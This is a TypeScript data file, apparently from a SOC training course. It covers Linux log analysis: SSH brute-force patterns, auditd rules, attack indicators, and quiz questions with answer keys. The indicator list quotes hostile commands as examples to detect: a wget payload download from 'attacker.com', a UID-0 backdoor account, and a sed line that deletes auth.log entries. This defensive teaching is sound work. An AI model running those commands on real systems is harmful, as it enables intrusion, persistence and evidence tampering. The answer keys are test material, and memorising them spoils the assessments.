      content: `SSH (Secure Shell) is the standard way administrators manage Linux servers remotely. It is also one of the most commonly attacked services on the internet. Every day, internet-facing SSH servers receive thousands of automated login attempts from bots scanning for weak passwords. Learning to distinguish between a background noise of automated scanning and a targeted, successful attack is a core SOC skill.\n\n**The Anatomy of SSH Log Entries**\n\nSSH logs four types of authentication events in auth.log/secure:\n\n1. **Successful password login**:\n   \`Nov 14 10:32:01 web-srv-01 sshd[1234]: Accepted password for alice from 10.0.0.5 port 42341 ssh2\`\n\n2. **Successful key-based login**:\n   \`Nov 14 10:35:22 web-srv-01 sshd[1235]: Accepted publickey for admin from 10.10.0.100 port 55123 ssh2: RSA SHA256:abc123...\`\n\n3. **Failed password attempt**:\n   \`Nov 14 02:17:33 web-srv-01 sshd[9823]: Failed password for root from 185.220.101.45 port 56234 ssh2\`\n\n4. **Invalid username attempt**:\n   \`Nov 14 02:17:34 web-srv-01 sshd[9824]: Invalid user admin from 185.220.101.45 port 45679\`\n\n**Pattern 1: Automated Brute Force Scanning**\n\nCharacteristics:\n- Hundreds or thousands of failures from a single IP in a short time\n- Targets common usernames: root, admin, ubuntu, ec2-user, pi, postgres, oracle\n- Rapid succession (sometimes multiple per second)\n- Source IP typically from known scanner/Tor exit node address ranges\n- No successful login follows\n\nThis is background noise. Most production servers see this constantly. The appropriate response is to use **fail2ban** (automatically blocks IPs after N failures) or restrict SSH to specific source IPs via firewall.\n\n**Pattern 2: Targeted Credential Attack (More Dangerous)**\n\nCharacteristics:\n- Slower pace (one attempt every few seconds or minutes) — deliberately avoiding rate limiting\n- Targets specific, real usernames for that organisation (not generic names like root/admin)\n- Source IP may rotate (using proxies or multiple hosts)\n- Eventually a successful logon appears\n\nThis suggests the attacker has intelligence about the target — possibly obtained usernames from a breach, LinkedIn, or a previous enumeration phase.\n\n**Pattern 3: Successful Login After Failures (Critical)**\n\nThis is what you are really hunting for:\n\`\`\`\nFailed password for alice from 185.220.101.45 port 51234 ssh2\nFailed password for alice from 185.220.101.45 port 51235 ssh2\nFailed password for alice from 185.220.101.45 port 51236 ssh2\nAccepted password for alice from 185.220.101.45 port 51237 ssh2\n\`\`\`\n\nA successful login from the same IP that just had multiple failures is a high-confidence indicator of a successful brute force attack. Investigate immediately:\n- What did this session do? Check auditd logs for commands run during this session.\n- Was this IP seen elsewhere in your environment?\n- Was alice's account used after this from any other IP (could indicate credential sharing)?\n\n**Pattern 4: Impossible Geographic Login**\n\n\`\`\`\nNov 14 09:15:22 Accepted password for alice from 10.5.1.100 port 44123 (New York, USA)\nNov 14 09:47:11 Accepted password for alice from 185.220.101.45 port 56234 (Moscow, Russia)\n\`\`\`\n\nAlice logged in from New York at 09:15 and from Moscow at 09:47 — 32 minutes apart. It is physically impossible to travel between these locations in 32 minutes. This is called **Impossible Travel** and strongly indicates account compromise — a threat actor is using Alice's stolen credentials.\n\n**auditd — Kernel-Level Command Auditing**\n\nWhile auth.log tells you WHO logged in via SSH, **auditd** tells you WHAT they did once inside. The Linux Audit Framework captures system calls at the kernel level:\n\nAudit rules file: \`/etc/audit/audit.rules\` or \`/etc/audit/rules.d/\`\n\nCommon rules SOC teams enable:\n\`\`\`\n# Monitor execution of all commands\n-a always,exit -F arch=b64 -S execve -k exec_commands\n\n# Monitor privilege escalation\n-a always,exit -F arch=b64 -S execve -F euid=0 -k privileged_command\n\n# Monitor changes to sensitive files\n-w /etc/passwd -p wa -k identity_change\n-w /etc/sudoers -p wa -k sudoers_change\n-w /etc/shadow -p wa -k shadow_change\n-w /var/spool/cron -p wa -k cron_change\n\n# Monitor SSH authorized_keys\n-w /root/.ssh -p wa -k ssh_key_change\n\`\`\`\n\nQuerying auditd logs:\n- \`ausearch -k privileged_command\` — find all events with the key "privileged_command"\n- \`ausearch -m EXECVE -ts today\` — all executed commands today\n- \`aureport --auth\` — authentication summary report\n- \`aureport --exe --summary\` — summary of executed programs\n\nAuditd event structure (SYSCALL record):\n\`\`\`\ntype=SYSCALL msg=audit(1731550929.123:456): arch=c000003e syscall=59 success=yes exit=0 \\\n  a0=7f... a1=0 a2=0 a3=0 items=2 ppid=9821 pid=9823 auid=33 uid=33 gid=33 euid=0 egid=0 \\\n  suid=0 sgid=0 fsuid=0 fsgid=0 tty=pts0 ses=42 comm="sudo" exe="/usr/bin/sudo" key="privileged_command"\n\`\`\`\n\nKey fields: \`auid\` (original logged-in user — stays the same even after su/sudo), \`uid\` (current user), \`euid\` (effective user — 0=root after sudo), \`exe\` (executable path), \`key\` (audit rule that matched).`,
      checkpoint: {
        question:
          "According to the reading, which auditd field stays constant for a user's entire session — even after they run sudo or su — making it the field used to trace an action back to the original login?",
        options: ["euid", "auid", "fsuid", "gid"],
        answer: 1,
        explanation:
          "auid (Audit User ID) is set at login and never changes, even through privilege escalation — that's exactly why it's used for accountability. euid changes to reflect the current effective privilege level (e.g., 0 after sudo).",
      },
    } satisfies ReadingTask,

    // -------------------------------------------------------------------------
    // Reading 3 — Common Attack Indicators in Linux Logs
    // -------------------------------------------------------------------------
    {
      type: "reading",
      id: "linux-logs-r3",
      heading: "Common Attack Indicators in Linux Logs",
      content: `As a SOC analyst, you will develop an eye for anomalies — log entries that stand out because they are unusual, suspicious, or simply wrong. Here is a compilation of the most important attack indicators to look for across Linux log files.\n\n**Authentication Indicators**\n\n- **Multiple 'Failed password for root'** from the same external IP: Automated brute force against the root account. Common and usually noise, but track if intensity increases or switches to valid usernames.\n- **'Accepted password for root'** from any external IP: Very suspicious. Root SSH login should be disabled (\`PermitRootLogin no\`). If you see a successful root login from an external IP, treat it as a critical incident immediately.\n- **'Failed password for invalid user X'**: The username X does not exist. Attacker is guessing usernames. Compile a list of attempted usernames — they may reveal attacker knowledge about your organisation's naming convention.\n- **Sudden stop in SSH failures followed by successful login**: Brute force succeeded. Investigate the session.\n- **SSH login from a new country for a known user**: Possible credential theft. Cross-reference with business travel records.\n\n**Privilege Escalation Indicators**\n\n- **sudo: user NOT in sudoers file**: \`sudo: alice : user NOT in the sudoers file ; This incident will be reported\`. A user tried to run sudo but is not authorised. Could be an attacker trying privilege escalation with a compromised low-priv account.\n- **sudo command = 'bash', 'sh', 'su'**: \`sudo bash\` or \`sudo su -\` spawns an unrestricted root shell. Legitimate admins occasionally do this, but it should be rare and expected.\n- **Modification of /etc/sudoers or /etc/sudoers.d/**: auditd key 'sudoers_change'. Any modification is extremely sensitive.\n- **New user added with UID 0**: \`useradd -u 0 -o backdoor\` creates a second root account. Look for new entries in /etc/passwd with UID 0.\n\n**Persistence Indicators**\n\n- **New cron entries appearing in /var/spool/cron/ or /etc/cron.d/**: auditd key 'cron_change'. Legitimate cron additions are usually documented changes. Unexpected ones are red flags.\n- **wget or curl commands downloading to /tmp**: \`wget http://attacker.com/payload -O /tmp/.x\` — downloading a payload. Check web server logs if the download source is internal.\n- **chmod +x or chmod 4755 on files in /tmp**: Making downloaded files executable, or adding SUID.\n- **New entries in ~/.ssh/authorized_keys**: SSH backdoor. auditd 'ssh_key_change' key.\n- **New service enabled**: \`systemctl enable malicious.service\`\n\n**Lateral Movement and Exfiltration Indicators**\n\n- **SSH outbound from a server** (not a workstation): Servers should not be initiating SSH connections to external IPs. This is a common sign of a compromised server being used as a pivot point.\n- **curl/wget to external IPs from a server** that normally only serves web traffic: Possible data exfiltration or C2 beacon.\n- **Large data transfers detected in web server access.log**: POST requests with large body sizes to unusual endpoints could be exfiltration via the web application.\n- **New listening ports**: \`netstat -tulpn\` or \`ss -tulpn\` shows a new port listening that was not there before — possible backdoor shell.\n\n**Log Tampering Indicators**\n\n- **Timestamps jump or gap**: If auth.log shows 10:00 then jumps to 14:00 with no entries, someone may have deleted log lines with \`sed -i '/root/d' /var/log/auth.log\`.\n- **Log file modification time is newer than last entries**: The file was written after the last log entry — possible log editing.\n- **auditd reports file open for write on /var/log/auth.log**: An attacker editing the log file.\n- **journald logs show gaps**: Systemd journal has sequence numbers — gaps indicate tampering.\n\n**Investigation Workflow for Linux Incidents**\n\n1. **Confirm the scope**: Which machine? What time did suspicious activity start? Is this one machine or many?\n2. **Check authentication first**: auth.log — who logged in, when, from where? Any sudo activity?\n3. **Check processes**: \`ps aux\` — any unexpected processes running from /tmp or with suspicious names?\n4. **Check network connections**: \`ss -tulpn\` / \`netstat -tulpn\` — any unexpected listening ports or outbound connections?\n5. **Check persistence**: crontabs, /etc/cron.d, systemd services, authorized_keys\n6. **Check auditd**: What commands were run? Any file modifications to sensitive files?\n7. **Preserve evidence**: If this is a serious incident, take a memory dump and disk image before any remediation. Evidence preservation comes before cleanup.\n8. **Remediate**: Block attacker access (change passwords, remove SSH keys, remove cron jobs), patch the exploited vulnerability, monitor for re-entry.`,
    } satisfies ReadingTask,

    // -------------------------------------------------------------------------
    // Question 1
    // -------------------------------------------------------------------------
    {
      type: "question",
      id: "linux-logs-q1",
      question:
        "What is the key difference between /var/log/auth.log (Debian/Ubuntu) and /var/log/audit/audit.log (auditd), and why does a SOC team need both?",
      options: [
        "Both hold the same data in text and binary form, so checking either one is enough",
        "auth.log holds userspace auth events (sshd, sudo, PAM); audit.log holds kernel-sourced syscall records of what actually executed",
        "auth.log holds only remote logins, while audit.log holds only local console logins",
        "audit.log exists only on RHEL-family systems and auth.log only on Debian-family ones",
      ],
      answer: 1,
      explanation:
        "auth.log is produced by userspace processes (sshd, sudo, PAM) and is a regular file that can be modified or cleared. auditd hooks into the Linux kernel's audit subsystem — it records syscalls (such as every execve) at the kernel level, independent of whether the application chooses to log anything, and each record carries a kernel-generated serial number, so gaps from deleted entries are detectable. It is not tamper-proof: audit.log is still an ordinary root-writable file, and root can stop auditd or flush its rules unless the rules are locked with 'auditctl -e 2' — which is why forwarding to a SIEM matters. Together they are complementary: auth.log gives human-readable event context, auditd gives kernel-verified command execution records. For forensics, auditd's 'auid' (audit user ID) field tracks the original login even after sudo/su changes.",
      xp: 30,
    } satisfies QuestionTask,

    // -------------------------------------------------------------------------
    // Log Analysis — SSH Brute Force
    // -------------------------------------------------------------------------
    {
      type: "log_analysis",
      id: "linux-logs-la1",
      heading: "SSH Brute Force Attack Against Web Server",
      context:
        "Your SIEM alert fires: 'SSH Brute Force — 312 failed authentication attempts in 4 minutes on web-srv-01'. You pull a representative event from the cluster. The pattern has continued for 4 minutes with no successful logins yet, but the attempt rate is still increasing.",
      event: {
        id: "linux-ssh-brute-evt-001",
        ts: "2024-11-22T03:41:09.000Z",
        source: "linux_audit",
        vendor: "Linux auditd",
        event_type: "ssh_failed",
        severity: "high",
        hostname: "web-srv-01.corp.internal",
        description:
          "Failed SSH password attempt for root — part of high-volume brute force campaign",
        mitre_technique: "T1110.001",
        mitre_tactic: "Credential Access",
        src_ip: "185.220.101.45",
        geo: { country: "Germany", city: "Frankfurt" },
        raw: {
          "log.file.path": "/var/log/auth.log",
          "message": "Failed password for root from 185.220.101.45 port 56234 ssh2",
          "syslog.hostname": "web-srv-01",
          "syslog.program": "sshd",
          "syslog.pid": 1234,
          "syslog.facility": "auth",
          "syslog.severity": "info",
          "event.type": "authentication_failure",
          "event.outcome": "failure",
          "user.name": "root",
          "source.ip": "185.220.101.45",
          "source.port": 56234,
          "@timestamp": "2024-11-22T03:41:09.000Z",
        },
      } satisfies TelemetryEvent,
      questions: [
        {
          question:
            "The target username is 'root' and the time is 03:41 AM. What is the immediate risk, and what should be the first containment action?",
          options: [
            "Low risk — PermitRootLogin is off by default on every distribution, so these failures are background noise to ignore",
            "A weak root password could fall to the brute force; block 185.220.101.45 and verify sshd_config has 'PermitRootLogin no'",
            "Rename the root account in /etc/passwd so the brute force keeps targeting a user that no longer exists",
            "Restart sshd to drop all connections, which also stops the source IP from reconnecting",
          ],
          answer: 1,
          explanation:
            "While modern SSH configs should have PermitRootLogin disabled, you cannot assume this is the case until you verify. The two-step response is: (1) block the attacker IP at the firewall immediately to stop the ongoing attack, and (2) verify sshd_config to confirm root login is disabled and password authentication is restricted. Also check if there is an Accepted password/publickey entry from this IP anywhere in auth.log — if so, the attack may have succeeded before the alert fired.",
          xp: 30,
        },
        {
          question:
            "What log query would best help you determine if the brute force SUCCEEDED at any point and the attacker got in?",
          options: [
            "grep 'Failed password' /var/log/auth.log | wc -l — count the failed attempts",
            "grep 'Accepted' /var/log/auth.log | grep '185.220.101.45' — find successful logins from the attacker's IP",
            "grep 'Failed password' /var/log/auth.log | grep '185.220.101.45' | tail -1 — see when the attempts stopped",
            "who -a — list the accounts logged in right now",
          ],
          answer: 1,
          explanation:
            "The critical question after a brute force attack is 'did they get in?' The grep for 'Accepted' from the same source IP directly answers this. 'Accepted' in auth.log is the SSH daemon's log message for a successful authentication (as opposed to 'Failed password'). If that grep returns any results, the attack succeeded and the incident severity jumps dramatically — from 'active attack' to 'active compromise'. You would then investigate what the attacker did during the session using auditd logs.",
          xp: 30,
        },
      ],
    } satisfies LogAnalysisTask,

    // -------------------------------------------------------------------------
    // Flag Task
    // -------------------------------------------------------------------------
    {
      type: "flag",
      id: "linux-logs-flag1",
      prompt:
        "Look at the SSH brute force log event above. What is the source IP address of the attacker? Look at the 'source.ip' field in the raw log.",
      answer: "185.220.101.45",
      hint: "The attacker's IP address is in the 'source.ip' field of the raw log, and also appears in the human-readable syslog message field. It is a public IP address in the format X.X.X.X.",
      xp: 20,
    } satisfies FlagTask,

    // -------------------------------------------------------------------------
    // Question 2 — journalctl
    // -------------------------------------------------------------------------
    {
      type: "question",
      id: "linux-logs-q2",
      question:
        "You need to check what the SSH service logged on November 22, 2024 between midnight and 06:00 AM. Which journalctl command would filter for exactly this?",
      options: [
        "journalctl -u sshd --since '2024-11-22 00:00:00' --until '2024-11-22 06:00:00'",
        "cat /var/log/auth.log | grep sshd | head -100",
        "systemctl status sshd --since '2024-11-22 00:00:00' --until '2024-11-22 06:00:00'",
        "ps -eo lstart,cmd | grep sshd",
      ],
      answer: 0,
      explanation:
        "journalctl is the tool for querying the systemd journal. The '-u sshd' flag filters by unit (the sshd.service). '--since' and '--until' define a time range in 'YYYY-MM-DD HH:MM:SS' format. Together this gives you all SSH daemon log entries for exactly the time window of interest — perfect for investigating an incident that occurred during a specific window. 'systemctl status sshd' only shows recent status, and 'ps aux' shows running processes, not log history.",
      xp: 25,
    } satisfies QuestionTask,

    // -------------------------------------------------------------------------
    // Question 3
    // -------------------------------------------------------------------------
    {
      type: "question",
      id: "linux-logs-q3",
      question:
        "An auditd event shows 'auid=1001' and 'euid=0'. The /etc/passwd file shows 'alice:x:1001:1001:Alice:/home/alice:/bin/bash'. What does this auditd record tell you?",
      options: [
        "auid=1001 marks an anonymous network session, since IDs above 1000 are unauthenticated in auditd",
        "Alice (UID 1001) is the original login, since auid persists through su/sudo; euid=0 means the command ran as root",
        "euid=0 shows Alice's own account has UID 0 in /etc/passwd, so she is a permanent superuser",
        "euid=0 is the auditd code for a denied privilege escalation, so the command never executed",
      ],
      answer: 1,
      explanation:
        "In auditd, 'auid' (Audit User ID) is set when a user logs in and remains constant throughout their session — even after sudo or su. This is specifically designed for accountability: you can always trace an action back to the original login. 'euid' (Effective User ID) changes when privileges are elevated. euid=0 = running as root. So auid=1001 + euid=0 means: Alice logged in (auid=1001) and then escalated to root (euid=0) via sudo or su to run this command. This is critical for post-incident attribution — even if an attacker compromises a service account and escalates, auid still tracks who originally authenticated.",
      xp: 30,
    } satisfies QuestionTask,

    // -------------------------------------------------------------------------
    // Question 4
    // -------------------------------------------------------------------------
    {
      type: "question",
      id: "linux-logs-q4",
      question:
        "While reviewing a compromised server's /var/log/auth.log, you notice the file has a 12-hour gap — entries go from 14:32 to 02:47 with nothing in between, then resume. The file modification time (from 'ls -la') is 02:47. What does this suggest?",
      options: [
        "The server was shut down overnight for power saving and resumed at 02:47, so no further action is needed",
        "An attacker likely edited auth.log to delete 12 hours of activity; check SIEM forwarding for the missing period",
        "rsyslogd crashed and restarted at 02:47, a known Debian bug that leaves a 12-hour gap without a restart message",
        "logrotate ran at 02:47 and moved the missing entries into auth.log.1, so the gap is expected",
      ],
      answer: 1,
      explanation:
        "A 12-hour gap in auth.log is a major red flag. Legitimate causes (server offline, syslog crash, log rotation) are possible but should be verifiable: check if the server has uptime records covering that period ('uptime' command or /proc/uptime), check if the syslog daemon shows restart events in /var/log/syslog, and check if auth.log.1 or auth.log.gz (rotated backup) covers the missing period. If none of these explain the gap, log tampering is likely. This is why SOC teams use SIEM log forwarding — if logs were forwarded to the SIEM before the attacker deleted them, you may still be able to recover the missing period from the SIEM's index.",
      xp: 35,
    } satisfies QuestionTask,
  ],
};

// ---------------------------------------------------------------------------
// Exports
// ---------------------------------------------------------------------------

const rooms: Room[] = [
  activeDirectory,
  windowsEventLogs,
  linuxFundamentals,
  linuxLogAnalysis,
];

export default rooms;
